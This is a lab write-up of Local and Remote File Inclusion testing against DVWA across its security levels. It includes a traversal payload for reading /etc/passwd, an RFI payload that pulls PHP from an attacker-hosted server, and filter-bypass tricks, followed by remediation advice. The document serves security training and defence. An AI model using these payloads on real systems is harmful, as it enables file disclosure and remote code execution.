# Cybersecurity: DVWA File Inclusion (LFI/RFI) Vulnerability Analysis

## Table of Contents
- [Introduction to DVWA](#-introduction-to-dvwa)
- [Project Overview](#-project-overview)
- [Objective](#-objective)
- [Lab Environment Architecture](#️-lab-environment-architecture)
- [Assessment Methodology & Execution](#-assessment-methodology--execution)
  - [1. Authentication & Setup](#1-authentication--setup)
  - [2. Local File Inclusion (LFI) Assessment](#2-local-file-inclusion-lfi-assessment)
  - [3. Remote File Inclusion (RFI) Assessment](#3-remote-file-inclusion-rfi-assessment)
- [Defense Mechanism Analysis](#-defense-mechanism-analysis)
  - [Medium Security (Blacklisting)](#medium-security-level-blacklisting)
  - [High Security (Pattern Matching)](#high-security-level-pattern-matching)
  - [Impossible Security (Strict Whitelisting)](#impossible-security-level-secure-baseline)
- [Security Impact & Remediation](#-security-impact--remediation)
- [Ethical Guidelines & Disclaimer](#️-ethical-guidelines--disclaimer)

---

## Introduction to DVWA
The **Damn Vulnerable Web Application (DVWA)** is a PHP/MySQL web application that is intentionally designed to be highly vulnerable. Its primary goal is to serve as an aid for security professionals, penetration testers, and developers to test their skills and tools in a legal, controlled environment. 

By practicing on DVWA, security engineers can safely explore the most common web vulnerabilities (such as those listed in the OWASP Top 10) across various levels of difficulty, ultimately gaining a deeper understanding of how these vulnerabilities manifest through bad coding practices and how to properly secure web applications against them.

## Project Overview
This project documents a comprehensive vulnerability assessment focusing specifically on **File Inclusion** vulnerabilities—namely Local File Inclusion (LFI) and Remote File Inclusion (RFI). 

This lab systematically tests how poorly sanitized user input in PHP `include()` functions can be exploited by an attacker to read sensitive local system files (LFI) or execute malicious remote code (RFI). Furthermore, this project analyzes the application's underlying PHP source code behavior across escalating security tiers (Low, Medium, High, and Impossible) to evaluate the effectiveness of various defensive coding mechanisms.

## Objective
To successfully exploit LFI and RFI vulnerabilities in a controlled environment, demonstrate the exfiltration of highly sensitive system files (such as `/etc/passwd`), achieve remote code execution via a custom-hosted external payload, and document how server-side input filtering attempts to mitigate these attacks.

## Lab Environment Architecture
*   **Attacker Machine:** Kali Linux
*   **Vulnerable Web Target (DVWA):** `192.168.109.129`
*   **Malicious Payload Host (RFI):** Windows Server 2022 (`192.168.109.133`)
*   **Web Technologies Stack:** PHP, Apache, MySQL

---

## Assessment Methodology & Execution

### 1. Authentication & Setup
**Objective:** To establish an authenticated session with the DVWA target and access the vulnerability modules.

**Methodology:**
Accessed the DVWA login portal via the local laboratory network and authenticated using administrative credentials. Navigated to the "DVWA Security" tab to configure the environment's security posture for each phase of the assessment.

**Result / Evidence:**
<br>

![DVWA Login](images/dvwa-login.png)
![DVWA Dashboard](images/logged-into-dvwa.png)

---

### 2. Local File Inclusion (LFI) Assessment
**Objective:** To exploit the `?page=` parameter to dynamically traverse the server's directory structure and read unauthorized local files.

**Security Level: LOW**
*   **Methodology:** In the Low security setting, the PHP script accepts the `page` parameter without any input validation or sanitization.
*   **Payload Executed:** `?page=../../../../../../../etc/passwd`
*   **Observation:** The Directory Traversal payload successfully escaped the web root directory (`/var/www/html`) and navigated to the base Linux filesystem. The application executed the include function, dumping the contents of the highly sensitive `/etc/passwd` file directly to the web browser. This exposed all local user accounts, including the `root` account and the custom `RootCipherX` user profile.

**Result / Evidence:**
<br>

![LFI Low Setup](images/security-level-set-to-low.png)
![LFI Successful Exploit](images/security-level-set-to-low-result.png)

---

### 3. Remote File Inclusion (RFI) Assessment
**Objective:** To force the vulnerable web server to fetch and execute a malicious PHP script hosted on an external, attacker-controlled server.

**Security Level: LOW**
*   **Methodology:** I provisioned a dedicated Windows Server 2022 instance (`192.168.109.133`) functioning strictly as the attacker's payload delivery server. I created a custom PHP payload (`f1.php`) designed to execute and display a persistent message to prove remote code execution.
*   **Payload Executed:** `?page=http://192.168.109.133/web/f1.php`
*   **Observation:** Because the DVWA server's `allow_url_include` setting was enabled and input was unsanitized, the target server fetched the remote file from the Windows Server and executed its contents locally. 

**Result / Evidence:**
<br>

![RFI Successful Exploit](images/rfi-security-level-set-to-low.png)
*(Note the successful execution of the custom Dhananjay Deshpande @RootCipherX payload hosted on the external Windows Server!)*

---

## Defense Mechanism Analysis
To deeply understand secure coding practices, the exact same payloads were tested against escalating security controls within DVWA.

### Medium Security Level (Blacklisting)
*   **Application Behavior:** The application implements basic blacklist filtering using the PHP `str_replace()` function. It attempts to strip out `http://`, `https://`, and `../` from the user input.
*   **Observation:** Standard directory traversal and RFI payloads fail and return blank pages, as the required strings are deleted before execution. 
*   **Security Flaw:** Blacklisting is inherently insecure. Attackers can easily bypass `str_replace()` by using nested traversals (e.g., `....//`) or mixed-case protocols (e.g., `hTtP://`).

![Medium Security Block](images/security-level-set-to-medium.png)
![Medium LFI Block](images/security-level-set-to-medium-result_2.png)
![Medium RFI Block](images/rfi-security-level-set-to-medium.png)

### High Security Level (Pattern Matching)
*   **Application Behavior:** The application utilizes the `fnmatch()` function to enforce a strict pattern match. The input *must* start with the exact string `file` or the inclusion is explicitly blocked.
*   **Observation:** The application successfully stops standard LFI/RFI attacks, returning an `ERROR: File not found!` message. While stronger than blacklisting, clever attackers might still bypass this using advanced techniques like `file://` wrappers.

![High Security Block](images/security-level-set-to-high_2.png)
![High LFI Block](images/security-level-set-to-high-result_2.png)
![High RFI Block](images/rfi-security-level-set-to-high.png)

### Impossible Security Level (Secure Baseline)
*   **Application Behavior:** The application abandons dynamic file inclusion entirely. It utilizes a strict, hardcoded **Whitelist**. The `?page=` parameter is checked against a static array. If it does not match the whitelist precisely, it defaults to a safe error page.
*   **Observation:** This is the industry-standard secure configuration. No evasion techniques, encodings, or wrappers can bypass a properly implemented strict whitelist.

![Impossible Security Block](images/security-level-set-to-impossible_2.png)
![Impossible LFI Block](images/security-level-set-to-impossible-result.png)
![Impossible RFI Block](images/rfi-security-level-set-to-impossible.png)

---

## Security Impact & Remediation

**Security Impact:**
*   **LFI (Local File Inclusion):** Allows attackers to read sensitive configuration files (e.g., `wp-config.php`), access system password hashes (if permissions allow), or achieve Remote Code Execution via Log Poisoning (injecting PHP code into Apache access logs and including the log file).
*   **RFI (Remote File Inclusion):** Leads to immediate, critical Remote Code Execution (RCE) and total server compromise by allowing the attacker to run arbitrary code on the host.

**Recommended Remediation:**
1.  **Disable Remote Inclusion:** Ensure `allow_url_include = Off` in the `php.ini` configuration file to permanently prevent RFI attacks.
2.  **Enforce Strict Whitelisting:** Never pass raw, unsanitized user input directly to filesystem APIs (`include`, `require`, `fopen`). Use strict arrays/whitelists to map user input to internal files.
3.  **Directory Jailing:** Configure `open_basedir` in PHP to restrict file operations strictly to the designated web root directory, mitigating directory traversal attacks.

---

## ⚖️ Ethical Guidelines & Disclaimer
This vulnerability assessment was conducted entirely within a private, self-hosted, and isolated Virtual Machine laboratory network. The target machine (DVWA) is intentionally designed with insecure coding practices to serve as a safe environment for educational research and web application penetration testing. All traffic generation, exploitation, and payload hosting were performed strictly for defensive cybersecurity training purposes.
